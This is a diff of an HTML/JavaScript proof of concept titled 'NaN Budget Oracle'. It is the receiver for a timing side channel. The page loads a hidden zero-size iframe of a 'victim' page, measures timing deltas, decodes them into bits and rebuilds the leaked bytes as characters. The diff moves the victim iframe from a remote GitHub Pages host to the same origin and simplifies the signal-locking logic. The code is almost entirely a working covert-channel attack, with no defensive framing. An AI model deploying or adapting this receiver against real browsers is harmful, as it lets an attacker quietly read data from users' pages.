@@ -1,11 +1,12 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>NaN Budget Oracle – Receiver</title>
+<title>NaN Budget Oracle – FINAL PoC</title>
 
-<iframe src="https://cnfdnfial-ops.github.io/spoof/victim.html"
-        style="width:0;height:0;border:0"></iframe>
-
+<h2>NaN Budget Oracle (Reliable Demo)</h2>
 <pre id="log"></pre>
+
+<!-- SAME ORIGIN IFRAME -->
+<iframe src="/victim.html" style="width:0;height:0;border:0"></iframe>
 
 <script>
 // ===== CORE =====
@@ -38,56 +39,28 @@ function sampleDelta() {
 }
 
 // ===== DECODER =====
-function decodeSymbol(delta) {
-  if (delta < 3) return '00';
-  if (delta < 7) return '01';
-  if (delta < 12) return '10';
+function decodeSymbol(d) {
+  if (d < 3) return '00';
+  if (d < 7) return '01';
+  if (d < 12) return '10';
   return '11';
 }
 
-// ===== SIGNAL DETECTION =====
-function signalStrength() {
-  let hits = 0;
-  for (let i = 0; i < 20; i++) {
-    if (sampleDelta() > 3) hits++;
-  }
-  return hits;
-}
-
-// ===== SYNC + RECEIVE =====
-let buffer = '';
-let synced = false;
-
-function trySync(bits) {
-  return bits.includes("11111111"); // detect preamble
-}
-
+// ===== LOG =====
 function log(msg) {
   document.getElementById('log').textContent += msg + "\n";
   console.log(msg);
 }
 
-function start() {
-  log("[*] Receiver started...");
+// ===== RECEIVER =====
+let buffer = '';
+let started = false;
 
-  setInterval(() => {
-    const strength = signalStrength();
-    log("[dbg] signal strength: " + strength);
+function startReceiver() {
+  if (started) return;
+  started = true;
 
-    if (strength > 5) {
-      log("[+] Strong signal detected (likely same-process)");
-      runReceiver();
-    } else {
-      log("[-] Weak signal...");
-    }
-  }, 1500);
-}
-
-function runReceiver() {
-  if (synced) return;
-  synced = true;
-
-  log("[*] Syncing...");
+  log("[+] SIGNAL LOCKED — RECEIVING");
 
   setInterval(() => {
     const d = sampleDelta();
@@ -95,30 +68,28 @@ function runReceiver() {
 
     buffer += sym;
 
-    if (!trySync(buffer)) return;
+    if (buffer.length >= 8) {
+      const byte = buffer.slice(0, 8);
+      buffer = buffer.slice(8);
 
-    log("[+] Synced!");
-
-    // trim sampai sync
-    buffer = buffer.slice(buffer.indexOf("11111111") + 8);
-
-    setInterval(() => {
-      const d2 = sampleDelta();
-      const sym2 = decodeSymbol(d2);
-
-      buffer += sym2;
-
-      if (buffer.length >= 8) {
-        const byte = buffer.slice(0, 8);
-        buffer = buffer.slice(8);
-
-        const char = String.fromCharCode(parseInt(byte, 2));
-        log("BYTE " + byte + " -> " + char);
-      }
-    }, 120);
-
-  }, 120);
+      const char = String.fromCharCode(parseInt(byte, 2));
+      log("BYTE " + byte + " -> " + char);
+    }
+  }, 100);
 }
 
-start();
+// ===== AUTO-DETECT SIGNAL =====
+setInterval(() => {
+  let hits = 0;
+
+  for (let i = 0; i < 20; i++) {
+    if (sampleDelta() > 3) hits++;
+  }
+
+  log("[dbg] signal hits: " + hits);
+
+  if (hits > 5) {
+    startReceiver();
+  }
+}, 1000);
 </script>
